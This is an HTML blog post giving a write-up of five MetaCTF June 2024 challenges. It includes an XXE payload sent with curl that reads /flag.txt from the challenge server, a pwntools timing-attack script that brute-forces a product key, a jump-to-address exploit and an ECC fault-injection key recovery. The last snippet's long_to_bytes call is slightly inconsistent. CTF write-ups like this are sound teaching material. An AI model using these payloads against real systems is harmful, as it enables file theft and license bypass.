@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️🏴 MetaCTF June 2024 Flash CTF</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+        <main class="container">
+            
+    <h1 class="title">
+        ️🏴 MetaCTF June 2024 Flash CTF
+    </h1>
+    <blockquote>A monthly mini CTF competition organized by MetaCTF and Antisyphon.</blockquote>
+    <p class="subtitle text-end"><strong>2024-06-21</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/ctf/" >
+                        #ctf
+                    </a>
+                
+            </small>
+        </p>
+    
+    <blockquote>
+<p><em>A monthly mini CTF competition organized by MetaCTF with support from
+Antisyphon Training and TCM Security. There will be 5 challenges and you will
+have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></p>
+</blockquote>
+<p>Details here: <a href="https://app.metactf.com/join/jun2024">https://app.metactf.com/join/jun2024</a>.</p>
+<h2 id="anonymoose">Anonymoose</h2>
+<blockquote>
+<p><em>Your anonymous music producer friend (D34DM0053) is getting ready to publish
+an open letter on mental health in the music industry, but they don't know
+much about computers. Can you help double check their letter to make sure it
+isn't leaking their identity?</em></p>
+<p><em><a href="https://metaproblems.com/0778e85952c806a4f55fb61d12fd8ca0/D34DM0053_Open_Letter_Mental_Health.pdf">Here's the letter in question.</a></em></p>
+</blockquote>
+<p>Things are off to a flying start as the flag is right there in the PDF's
+metadata:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> pdfinfo D34DM0053_Open_Letter_Mental_Health.pdf
+</span><span style="color:#bf616a;">Author:</span><span>          MetaCTF{Wren_Gaillard}
+</span><span style="color:#bf616a;">Creator:</span><span>         Writer
+</span><span style="color:#bf616a;">Producer:</span><span>        OpenOffice 4.1.15
+</span><span style="color:#bf616a;">CreationDate:</span><span>    Tue Jun 11 17:42:36 2024 BST
+</span><span style="color:#bf616a;">Custom</span><span> Metadata: no
+</span><span style="color:#bf616a;">Metadata</span><span> Stream: yes
+</span><span style="color:#bf616a;">Tagged:</span><span>          no
+</span><span style="color:#bf616a;">UserProperties:</span><span>  no
+</span><span style="color:#bf616a;">Suspects:</span><span>        no
+</span><span style="color:#bf616a;">Form:</span><span>            none
+</span><span style="color:#bf616a;">JavaScript:</span><span>      no
+</span><span style="color:#bf616a;">Pages:</span><span>           1
+</span><span style="color:#bf616a;">Encrypted:</span><span>       no
+</span><span style="color:#bf616a;">Page</span><span> size:       612 x 792 pts (letter)
+</span><span style="color:#bf616a;">Page</span><span> rot:        0
+</span><span style="color:#bf616a;">File</span><span> size:       128361 bytes
+</span><span style="color:#bf616a;">Optimized:</span><span>       no
+</span></code></pre>
+<h2 id="where-we-jmping">Where We JMPing</h2>
+<blockquote>
+<p><em>Quick, we need to pick a place to JMP to! Can your tremendous strategy get
+us the win?</em></p>
+<p><em>Connect via <code>nc kubenode.mctf.io 30006</code> and find out.</em></p>
+<p><em>You can grab the
+<a href="http://metaproblems.com/d7b1bc353806df056180404b80955245/where_we_jmping">binary here</a>.
+Good luck!</em></p>
+</blockquote>
+<p>Loading the provided <code>where_we_jmping</code> binary into
+<a href="https://dogbolt.org/">Decompiler Explore</a>, there's this in Hex-Rays:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">//----- (00000000004011A6) ----------------------------------------------------
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">win</span><span>()
+</span><span>{
+</span><span>  </span><span style="color:#b48ead;">char</span><span> v1; </span><span style="color:#65737e;">// [rsp+7h] [rbp-9h]
+</span><span>  FILE *stream; </span><span style="color:#65737e;">// [rsp+8h] [rbp-8h]
+</span><span>
+</span><span>  stream = </span><span style="color:#96b5b4;">fopen</span><span>(&quot;</span><span style="color:#a3be8c;">flag.txt</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span>&quot;);
+</span><span>  </span><span style="color:#b48ead;">if </span><span>( !stream )
+</span><span>    </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Error: Could not find &#39;flag.txt&#39;</span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Contents of &#39;flag.txt&#39;:</span><span>&quot;);
+</span></code></pre>
+<p>That <code>00000000004011A6</code> is the offset of this function:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> nc kubenode.mctf.io 30006
+</span><span style="color:#bf616a;">Enter</span><span> a memory address to jump to (as a hexadecimal, e.g., 0x401222)</span><span style="color:#96b5b4;">:</span><span> 0x4011A6
+</span><span style="color:#bf616a;">Jumping</span><span> to address 0x4011a6!
+</span><span style="color:#bf616a;">Contents</span><span> of &#39;</span><span style="color:#a3be8c;">flag.txt</span><span>&#39;:
+</span><span style="color:#bf616a;">MetaCTF{jmp1ng_t0_th3_g00d_l00t</span><span>}
+</span></code></pre>
+<h2 id="dot-matrix-destruction">Dot-Matrix Destruction</h2>
+<blockquote>
+<p><em>I wanted to buy one of those squeaky old printers from this vintage printer
+company, but they're all so overpriced. Forget that. Can you just have them
+print out the flag for us?</em></p>
+<p><em>The flag is at <code>/flag.txt</code>.</em></p>
+</blockquote>
+<p>The challenge spawns a container at <code>http://py42aoqa.chals.mctf.io/</code>. There's
+no obvious SQLi or similar but the input is XML so…XXE time!</p>
+<p>There's a fairly standard LFI via XXE. That allows files to be <em>read</em> but how
+to actual present the contents of that file? Thankfully, if an invalid
+<code>&lt;country&gt;</code> element is passed, the invalid data are presented in the resulting
+error message, allowing the LFI to be similarly displayed:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">curl</span><span> http://py42aoqa.chals.mctf.io/api/search_printers \
+</span><span style="color:#bf616a;">    --silent </span><span>\
+</span><span style="color:#bf616a;">    --include </span><span>\
+</span><span style="color:#bf616a;">    --request</span><span> POST \
+</span><span style="color:#bf616a;">    --header </span><span>&#39;</span><span style="color:#a3be8c;">Content-Type: text/plain;charset=UTF-8</span><span>&#39; \
+</span><span style="color:#bf616a;">    --data </span><span>$&#39;
+</span><span style="color:#a3be8c;">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+</span><span style="color:#a3be8c;">&lt;!DOCTYPE foo [&lt;!ENTITY ctf SYSTEM &quot;/flag.txt&quot;&gt; ]&gt;
+</span><span style="color:#a3be8c;">&lt;query&gt;&lt;search&gt;3&lt;/search&gt;&lt;country&gt;&amp;ctf;&lt;/country&gt;&lt;/query&gt;</span><span>&#39;
+</span><span style="color:#bf616a;">HTTP/1.1</span><span> 200 OK
+</span><span style="color:#bf616a;">Date:</span><span> Fri, 21 Jun 2024 18:05:56 GMT
+</span><span style="color:#bf616a;">Content-Type:</span><span> text/html; </span><span style="color:#bf616a;">charset</span><span>=</span><span style="color:#a3be8c;">utf-8
+</span><span style="color:#bf616a;">Content-Length:</span><span> 123
+</span><span style="color:#bf616a;">Connection:</span><span> keep-alive
+</span><span>
+</span><span>
+</span><span>        &lt;error&gt;The </span><span style="color:#bf616a;">country</span><span> code MetaCTF{y3ah_xxe_d0e5_r0ck_d0esnt_it?}
+</span><span> </span><span style="color:#bf616a;">is</span><span> not a recognized country code.&lt;/error&gt;
+</span></code></pre>
+<h2 id="clock-out">Clock Out</h2>
+<blockquote>
+<p><em>I'm trying to crack this timecard software so I can <em>illegally</em> use it for
+free. Pls Help!</em></p>
+<p><em>Grab the binary
+<a href="https://metaproblems.com/7844b782a8488bf31e5ce61c2597494b/clock_out">here</a>.</em></p>
+</blockquote>
+<p>When run, the provided <code>clock_out</code> binary prompts for a product key. There are
+some initial checks (like the flag being exactly 22 characters), then each
+character of the input value is hashed:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>    </span><span style="color:#b48ead;">while </span><span>(</span><span style="color:#d08770;">true</span><span>)
+</span><span>    {
+</span><span>        v4 = </span><span style="color:#d08770;">0</span><span>;
+</span><span>        v3 = *((</span><span style="color:#b48ead;">char </span><span>*)v11);
+</span><span>        </span><span style="color:#bf616a;">SHA256_Init</span><span>(&amp;v2);
+</span><span>        </span><span style="color:#bf616a;">SHA256_Update</span><span>(&amp;v2, v0, </span><span style="color:#d08770;">1</span><span>);
+</span><span>        </span><span style="color:#bf616a;">SHA256_Final</span><span>(v1, &amp;v2);
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(*((</span><span style="color:#b48ead;">int </span><span>*)v12) != *((</span><span style="color:#b48ead;">int </span><span>*)&amp;v5))
+</span><span>        {
+</span><span>            v12 += </span><span style="color:#d08770;">4</span><span>;
+</span><span>            v9 -= </span><span style="color:#d08770;">8</span><span>;
+</span><span>            v11 += </span><span style="color:#d08770;">1</span><span>;
+</span><span>            </span><span style="color:#bf616a;">usleep</span><span>(</span><span style="color:#d08770;">0x64</span><span>);
+</span><span>            </span><span style="color:#b48ead;">if </span><span>(v12 == v10)
+</span><span>                </span><span style="color:#b48ead;">return </span><span>!v9;
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else
+</span><span>        {
+</span><span>            v12 += </span><span style="color:#d08770;">4</span><span>;
+</span><span>            v9 -= </span><span style="color:#d08770;">16</span><span>;
+</span><span>            v11 += </span><span style="color:#d08770;">1</span><span>;
+</span><span>            </span><span style="color:#bf616a;">usleep</span><span>(</span><span style="color:#d08770;">0x2710</span><span>);
+</span><span>            </span><span style="color:#b48ead;">if </span><span>(v12 == v10)
+</span><span>                </span><span style="color:#b48ead;">return </span><span>!v9;
+</span><span>        }
+</span><span>    }
+</span></code></pre>
+<p>Depending on whether the hashed character is in a pre-existing list of hashes,
+it sleeps for a different duration: it's a timing attack.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>sys
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span>context, process
+</span><span>
+</span><span>
+</span><span>context.binary = &quot;</span><span style="color:#a3be8c;">./clock_out</span><span>&quot;
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">error</span><span>&quot;
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run_proc</span><span>(</span><span style="color:#bf616a;">cmd</span><span>, </span><span style="color:#bf616a;">product_key</span><span>):
+</span><span>    p = </span><span style="color:#bf616a;">process</span><span>()
+</span><span>    p.</span><span style="color:#bf616a;">readuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Enter your Product Key</span><span style="color:#96b5b4;">\n\n</span><span>&quot;)
+</span><span>    p.</span><span style="color:#bf616a;">sendline</span><span>(product_key.</span><span style="color:#bf616a;">encode</span><span>())
+</span><span>    </span><span style="color:#bf616a;">_ </span><span>= p.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>    p.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span>
+</span><span>flag = &quot;</span><span style="color:#a3be8c;">MetaCTF{</span><span>&quot;
+</span><span>
+</span><span style="color:#b48ead;">while </span><span>not flag.</span><span style="color:#bf616a;">endswith</span><span>(&quot;</span><span style="color:#a3be8c;">}</span><span>&quot;):
+</span><span>    timings = </span><span style="color:#bf616a;">list</span><span>()
+</span><span>    </span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">33</span><span>, </span><span style="color:#d08770;">127</span><span>):
+</span><span>        sys.stdout.</span><span style="color:#bf616a;">write</span><span>(flag + </span><span style="color:#96b5b4;">chr</span><span>(c) + &quot;</span><span style="color:#96b5b4;">\r</span><span>&quot;)
+</span><span>        sys.stdout.</span><span style="color:#bf616a;">flush</span><span>()
+</span><span>
+</span><span>        product_key = flag + </span><span style="color:#96b5b4;">chr</span><span>(c) + &quot;</span><span style="color:#a3be8c;">#</span><span>&quot; * (</span><span style="color:#d08770;">22 </span><span>- (</span><span style="color:#96b5b4;">len</span><span>(flag) + </span><span style="color:#d08770;">1</span><span>))
+</span><span>
+</span><span>        start = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>        p = </span><span style="color:#bf616a;">process</span><span>()
+</span><span>        p.</span><span style="color:#bf616a;">readuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Enter your Product Key</span><span style="color:#96b5b4;">\n\n</span><span>&quot;)
+</span><span>        p.</span><span style="color:#bf616a;">sendline</span><span>(product_key.</span><span style="color:#bf616a;">encode</span><span>())
+</span><span>        </span><span style="color:#bf616a;">_ </span><span>= p.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>        p.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>        duration = time.</span><span style="color:#bf616a;">time</span><span>() - start
+</span><span>
+</span><span>        timings.</span><span style="color:#bf616a;">append</span><span>((c, duration))
+</span><span>
+</span><span>    (c, </span><span style="color:#bf616a;">_</span><span>), *</span><span style="color:#bf616a;">_ </span><span>= </span><span style="color:#96b5b4;">sorted</span><span>(timings, </span><span style="color:#bf616a;">key</span><span>=</span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">t</span><span>: t[</span><span style="color:#d08770;">1</span><span>], </span><span style="color:#bf616a;">reverse</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span>    flag += </span><span style="color:#96b5b4;">chr</span><span>(c)
+</span><span>    sys.stdout.</span><span style="color:#bf616a;">write</span><span>(flag + &quot;</span><span style="color:#96b5b4;">\r</span><span>&quot;)
+</span><span>
+</span><span style="color:#96b5b4;">print</span><span>(flag)
+</span></code></pre>
+<p>After a while:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> python3 clock_out.py
+</span><span style="color:#bf616a;">MetaCTF{time-</span><span>&gt;tm_hour}
+</span></code></pre>
+<h2 id="faulty-curves">Faulty Curves</h2>
+<blockquote>
+<p><em>There's something wrong with my decryptor... Download the source code
+<a href="https://metaproblems.com/d0e9282c1182fa983b6971906d80f0ca/FaultyCurves.zip">here</a>.</em></p>
+</blockquote>
+<p>The function naming here is fairly kind: it's using Elliptic Curve Cryptography
+but, by virtue of the <code>fault()</code> function, is adding "faults" into the private
+key (<code>my_priv</code>). Specifically, it's flipping bits.</p>
+<p>For every bit in the private key, it:</p>
+<ul>
+<li>generates a random message point <code>M</code> on the curve and stores it;</li>
+<li>computes encrypted points, <code>C1</code> and <code>C2</code>;</li>
+<li>injects a fault into the private key by flipping a bit;</li>
+<li>uses the new, faulty private key to decrypt <code>C2</code>.</li>
+</ul>
+<p>To reverse this, given <code>ms</code>, <code>C1s</code>, <code>C2s</code> and <code>decs</code> as per the <code>out.txt</code> file,
+it should be possible to:</p>
+<ul>
+<li>convert the stored coordinates back to their Elliptic Curve points;</li>
+<li>determine the difference between the decrypted point and the message point;</li>
+<li>calculate the point product for the current bit;</li>
+<li>from that, determine whether the bit should be a <code>1</code> or <code>0</code>.</li>
+</ul>
+<p>I admit that I barely understand that; I've a lot of reading to do…</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">for </span><span>bit_position </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#96b5b4;">len</span><span>(ms)):
+</span><span>    message_point = </span><span style="color:#bf616a;">E</span><span>(ms[bit_position])
+</span><span>    C1_point = </span><span style="color:#bf616a;">E</span><span>(C1s[bit_position])
+</span><span>    C2_point = </span><span style="color:#bf616a;">E</span><span>(C2s[bit_position])
+</span><span>    decrypted_point = </span><span style="color:#bf616a;">E</span><span>(decs[bit_position])
+</span><span>    
+</span><span>    difference = decrypted_point - message_point
+</span><span>    
+</span><span>    point_product = C1_point * (</span><span style="color:#d08770;">2 </span><span>** bit_position)
+</span><span>    
+</span><span>    </span><span style="color:#b48ead;">if </span><span>point_product == difference:
+</span><span>        reconstructed_priv_key_bits += &quot;</span><span style="color:#a3be8c;">1</span><span>&quot;
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        reconstructed_priv_key_bits += &quot;</span><span style="color:#a3be8c;">0</span><span>&quot;
+</span></code></pre>
+<p><code>reconstructed_priv_key_bits</code> at this point is backwards due to the way it was
+processed but thankfully:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>private_key = </span><span style="color:#bf616a;">int</span><span>(reconstructed_priv_key_bits[::-</span><span style="color:#d08770;">1</span><span>], </span><span style="color:#d08770;">2</span><span>)
+</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">long_to_bytes</span><span>(reconstructed_priv_key_bits).</span><span style="color:#bf616a;">decode</span><span>())
+</span></code></pre>
+<p>…which gives:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">MetaCTF{F4ult_1nj3ect10n_FTW</span><span>}
+</span></code></pre>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2024 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
